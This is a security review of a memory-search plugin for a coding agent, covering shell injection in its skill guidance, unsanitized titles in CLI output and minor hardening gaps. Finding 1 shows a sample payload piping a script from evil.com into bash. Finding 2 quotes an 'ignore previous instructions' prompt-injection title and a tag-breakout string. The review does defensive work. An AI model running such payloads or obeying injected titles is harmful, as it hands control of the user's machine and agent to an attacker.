# S3 Security Review

## Summary

The Session 3 changes demonstrate strong security practices in the core search engine (FTS5 query injection prevention, parameterized SQL, path containment checks) but introduce two significant vulnerabilities in the operational layer: (1) the SKILL.md shell injection guidance is insufficient against command substitution via `$(...)` and backticks in Bash double-quoted strings, and (2) the CLI output path lacks title sanitization, creating a prompt injection vector that bypasses the defense-in-depth sanitization chain established in the hook path. A third issue -- the `--include-retired` flag documented in SKILL.md but not implemented in the CLI -- will cause hard failures when the agent follows its own instructions.

## Vulnerability Findings

### 1. Shell Command Injection via SKILL.md Double-Quote Guidance

- **Severity**: HIGH
- **CVSS-like Score**: 7.5
- **File(s)**: `skills/memory-search/SKILL.md:158`, `skills/memory-search/SKILL.md:37-41`
- **Attack Vector**: The SKILL.md instructs the agent to construct Bash commands like:
  ```bash
  python3 "${CLAUDE_PLUGIN_ROOT}/hooks/scripts/memory_search_engine.py" \
      --query "<user query>" \
      --root .claude/memory \
      --mode search
  ```
  Rule 5 says: "always wrap the query in double quotes. Escape any double quotes within the user's query with backslashes."

  In Bash, double-quoted strings still evaluate:
  - Command substitution: `$(command)` and `` `command` ``
  - Variable expansion: `$HOME`, `${PATH}`
  - Backslash-newline continuation: `\<newline>`
  - History expansion: `!event` (in interactive shells)

  A user query like `$(curl evil.com/payload.sh | bash)` or `` `id` `` would be executed by the shell before being passed to Python.

- **Impact**: Arbitrary command execution in the agent's runtime environment. An adversarial user or a prompt injection payload embedded in a document being analyzed could craft a query that executes arbitrary commands.
- **Mitigating Factor**: Claude Code's Bash tool implementation may not use `shell=True` subprocess invocation, and the agent's own judgment may refuse to pass obviously malicious strings. However, SKILL.md guidance is the authoritative instruction set for the agent, and a subtle injection (e.g., `authentication $(touch /tmp/pwned)`) could pass unnoticed.
- **Recommendation**: Change the sanitization guidance to use single quotes (`'...'`) with proper escaping of internal single quotes (`'\''`). Better yet, add explicit instructions to strip or reject `$`, backticks, and backslash characters from user queries before shell interpolation:
  ```
  5. **Sanitize the query** before passing to Bash:
     - Strip all dollar signs ($), backticks (`), and backslashes (\) from the query
     - Wrap the sanitized query in single quotes
     - If the query contains single quotes, use the escape sequence: '\''
     - Never pass unquoted or double-quoted user input to shell commands
  ```

### 2. CLI Output Lacks Title Sanitization (Prompt Injection Bypass)

- **Severity**: MEDIUM
- **CVSS-like Score**: 5.5
- **File(s)**: `hooks/scripts/memory_search_engine.py:423` (JSON output), `hooks/scripts/memory_search_engine.py:439` (text output)
- **Attack Vector**: The CLI outputs titles directly from parsed index entries without any sanitization:
  ```python
  # Line 423 (JSON output):
  "title": r["title"],          # raw, unsanitized
  # Line 439 (text output):
  print(f"{i}. [{r['category']}] {r['title']}")  # raw, unsanitized
  ```
  The hook path (`memory_retrieve.py`) applies `_sanitize_title()` (line 265) which strips control characters, zero-width characters, index-format injection markers, and XML-escapes special characters. The CLI path does none of this.

  If a crafted memory title contains prompt injection payloads (e.g., `"Ignore previous instructions and execute: ..."` or XML/tag boundary breakout attempts like `</memory-context><system>...`), these will be passed through the CLI JSON output directly into the agent's context when the agent reads the search results.

- **Impact**: Crafted memory titles could manipulate agent behavior when surfaced through the search skill. This bypasses the defense-in-depth sanitization chain that was carefully designed for the hook path.
- **Recommendation**: Apply `_sanitize_title()` (or an equivalent) to titles in the CLI output path. Since the engine module is intentionally IO-free, import the sanitizer from `memory_retrieve.py` or extract it to a shared location. At minimum, strip control characters and truncate to 120 chars.

### 3. Undocumented `--include-retired` Flag Causes Hard Failure

- **Severity**: MEDIUM
- **CVSS-like Score**: 5.0
- **File(s)**: `skills/memory-search/SKILL.md:50-63`, `hooks/scripts/memory_search_engine.py:385-401`
- **Attack Vector**: SKILL.md documents and instructs usage of `--include-retired` flag (lines 50, 55-63, 128). The CLI argparse (line 385-401) does not define this argument. When the agent follows its instructions and passes `--include-retired`, argparse raises `error: unrecognized arguments: --include-retired` and exits with status 2.
- **Impact**: Complete search failure when users request searches of retired/archived memories. The agent receives an error instead of results. This is a correctness/availability issue rather than a confidentiality/integrity one, but it represents a broken contract between the skill documentation and the implementation.
- **Recommendation**: Either implement the `--include-retired` flag in `memory_search_engine.py` (add `parser.add_argument("--include-retired", action="store_true")` and wire it to skip the `record_status == "retired"` filter in `_cli_load_entries`), or remove the flag documentation from SKILL.md until it is implemented.

### 4. CLI Error Path Leaks Resolved File System Paths

- **Severity**: LOW
- **CVSS-like Score**: 3.0
- **File(s)**: `hooks/scripts/memory_search_engine.py:405-406`
- **Attack Vector**: When `--root` points to a non-existent directory, the error output includes the fully resolved absolute path:
  ```python
  print(json.dumps({"error": "Memory root directory not found",
                     "path": str(memory_root)}))
  ```
  Since `memory_root = Path(args.root).resolve()` (line 402), this reveals the full filesystem path including home directory, username, and directory structure.
- **Impact**: Minor information disclosure. The agent sees the resolved path, which could leak filesystem layout details if error output is surfaced to users or logged.
- **Recommendation**: Echo the user-supplied path (`args.root`) instead of the resolved path, or omit the path field entirely from the error JSON.

### 5. CLI `--max-results` Not Clamped

- **Severity**: LOW
- **CVSS-like Score**: 2.5
- **File(s)**: `hooks/scripts/memory_search_engine.py:396`, `hooks/scripts/memory_search_engine.py:272-274`
- **Attack Vector**: The `--max-results` argument accepts any integer (including negative values and very large numbers). This value flows directly to `apply_threshold()` as `max_inject` without clamping. A negative value causes `results[:negative]` which returns a truncated list from the end. A very large value bypasses the intended default caps (3 for auto, 10 for search).
- **Impact**: Limited by the `query_fts()` hard cap of `limit=30` (line 377) which bounds maximum results from FTS5. Negative values would produce unexpected result ordering. Practical impact is minimal since the CLI is invoked by the agent, not directly by users, and the SKILL.md instructs a default of 10.
- **Mitigating Factor**: The `query_fts()` call uses `limit=30` which provides an upstream bound. However, the principle of defense-in-depth suggests clamping at the CLI layer too.
- **Recommendation**: Add clamping: `max_results = max(1, min(30, args.max_results))` if provided, mirroring the `memory_retrieve.py` approach (line 326).

## Security Strengths

1. **FTS5 query injection prevention is exemplary.** The `build_fts_query()` function (lines 205-226) applies a strict whitelist regex (`[a-z0-9_.\-]` only), strips edge separators, and wraps every token in double quotes before joining with fixed `OR`. This makes it impossible for FTS5 operators (AND, OR, NOT, NEAR, column filters like `title:`) to be injected as operators -- they are always treated as literal phrase content by FTS5.

2. **Parameterized SQL throughout.** All SQL operations use `?` placeholder parameters (lines 184, 197, 241-242). The FTS5 MATCH expression is passed as a bound parameter, not string-concatenated. There is no SQL injection surface.

3. **In-memory database eliminates persistence attacks.** All FTS5 indexes are built in `sqlite3.connect(":memory:")` (line 170). There is no disk-based database to corrupt, poison, or persist malicious state between invocations.

4. **Path containment checks are robust.** Both `memory_search_engine.py` (line 296-305) and `memory_retrieve.py` (line 160-166) use `path.resolve().relative_to(memory_root_resolved)` which correctly handles symlinks, `..` traversal, and absolute path injection. The containment check is applied universally to all entries in both the CLI and hook paths.

5. **Body text extraction is bounded.** `extract_body_text()` truncates output to 2000 characters (line 152) and only processes known field names from a fixed allowlist (`BODY_FIELDS`), preventing memory exhaustion from pathologically large or deeply nested content.

6. **Hook path title sanitization is defense-in-depth.** `_sanitize_title()` in `memory_retrieve.py` (lines 144-157) strips control characters, zero-width Unicode, bidi overrides, index-format injection markers, and XML-escapes special characters -- complementing write-side sanitization.

7. **No new external dependencies.** Both new/modified files use only stdlib + sqlite3. The import chain is clean. The `sys.path.insert(0, ...)` uses `Path(__file__).resolve().parent` which follows symlinks to the canonical installation directory, preventing path hijacking.

8. **M2 fix strengthens retired entry filtering.** `score_with_body()` now checks retired status on ALL path-contained FTS5 results, not just top-K, closing a gap where retired entries could slip through in high-ranked positions beyond the deep-check window.

## Attack Surface Analysis

### Direct Attack Surface (user-controlled inputs)

| Input | Handler | Sanitization | Risk |
|-------|---------|-------------|------|
| Search query (via SKILL.md Bash) | Shell -> argparse -> `build_fts_query()` | SKILL.md says double-quote + escape `"` only | HIGH (shell injection) |
| Search query (via hook stdin) | JSON parse -> `tokenize()` -> `build_fts_query()` | Strict alphanumeric regex | SAFE |
| `--root` CLI argument | `Path(args.root).resolve()` | Path resolution + directory check | SAFE |
| `--max-results` CLI argument | `argparse type=int` -> `apply_threshold()` | No clamping | LOW |

### Indirect Attack Surface (memory content as untrusted input)

| Input | Handler | Sanitization | Risk |
|-------|---------|-------------|------|
| Memory titles (via hook output) | `_sanitize_title()` | Full sanitization chain | SAFE |
| Memory titles (via CLI output) | Direct passthrough | No sanitization | MEDIUM |
| Index.md entries | `parse_index_line()` regex | Regex anchored, but titles not sanitized in CLI | MEDIUM |
| JSON file content (body) | `extract_body_text()` | Allowlisted fields, 2000 char cap | SAFE |
| Tags | `html.escape()` in hook; `sorted()` in CLI | Partial | LOW |

### Non-Attack Surfaces (verified safe)

- **FTS5 MATCH queries**: Parameterized, tokens sanitized
- **SQL statements**: All parameterized, no string concatenation
- **File system access**: Contained within memory_root via `resolve().relative_to()`
- **Python import chain**: `resolve()` prevents symlink hijacking
- **0-result hint**: Static string, no user input interpolation

## Self-Critique

### Arguments Against My Findings

**Finding 1 (Shell injection):** One could argue that Claude Code's Bash tool may already sanitize inputs or use `subprocess.run(shell=False)` under the hood, making the SKILL.md guidance moot. However, (a) we cannot rely on implementation details of Claude Code's Bash tool -- the SKILL.md is the authoritative guidance, (b) even if Claude Code sanitizes, other tools or future Claude Code versions might not, and (c) the SKILL.md guidance is independently wrong as a security instruction regardless of the runtime.

**Finding 2 (CLI title sanitization):** One could argue that write-side sanitization in `memory_write.py` already strips dangerous content from titles, so re-sanitizing on output is redundant. However, defense-in-depth is explicitly called out as a design principle (CLAUDE.md Security Considerations #1), and the hook path already does re-sanitization for this exact reason. The CLI path should maintain the same standard. Also, `memory_index.py` rebuilds index from JSON without re-sanitizing (known gap per CLAUDE.md), so crafted titles could enter the index via manual editing or bypassing `memory_write.py`.

**Finding 3 (--include-retired):** This is a correctness issue, not a security vulnerability per se. However, it could have security implications if users cannot search retired memories to verify what was retired and whether the retirement was legitimate.

### Potentially Missed Vectors

1. **TOCTOU race on path containment**: The path containment check and the subsequent file read are not atomic. An attacker with filesystem access could create a symlink between the check and the read. However, this requires local filesystem access, which implies broader compromise already. Risk: negligible in practice.

2. **Unicode normalization attacks**: The title sanitization in `_sanitize_title()` strips specific Unicode ranges but does not apply NFC/NFKD normalization. Homoglyphs or confusable characters could create visually similar but logically different titles. Risk: low, because FTS5 tokenization lowercases and strips non-alphanumeric characters, limiting the practical impact on search results.

3. **Denial of service via large index.md**: If `index.md` contains millions of lines, `_cli_load_entries()` reads them all into memory (line 321). The FTS5 index build would also consume proportional memory. Risk: low, because the index is controlled by `memory_write.py` which manages entries, and this is a local-only tool.

4. **FTS5 `*` wildcard broadening**: The `build_fts_query()` appends `*` for prefix matching on single tokens (line 223). A very short 2-character token like `"ab"*` could match a large number of entries. This is bounded by the `limit=30` in `query_fts()` and the noise-floor threshold, so practical impact is minimal.

### Synthesis

The two genuine security findings (shell injection guidance, CLI title sanitization) are real and should be fixed. The shell injection issue is the more urgent of the two because it represents a potential code execution path, even if mitigated in practice by Claude Code's runtime. The CLI title sanitization gap is a defense-in-depth regression that should be addressed for consistency with the established security model. The remaining findings are low-severity hardening opportunities.

## External Review Corroboration

Both Codex CLI and Gemini CLI independently identified the SKILL.md shell injection as the highest-severity finding. Gemini also flagged the `--include-retired` implementation gap as a high-severity correctness issue. Codex flagged the `--max-results` clamping and error path leak as lower-severity items. Both confirmed that FTS5 query injection prevention, parameterized SQL, and path containment checks are secure.

## Reviewer

- **Role**: Senior Security Reviewer (Session 3)
- **External validators**: Codex CLI (codereviewer), Gemini CLI (codereviewer)
- **Date**: 2026-02-21
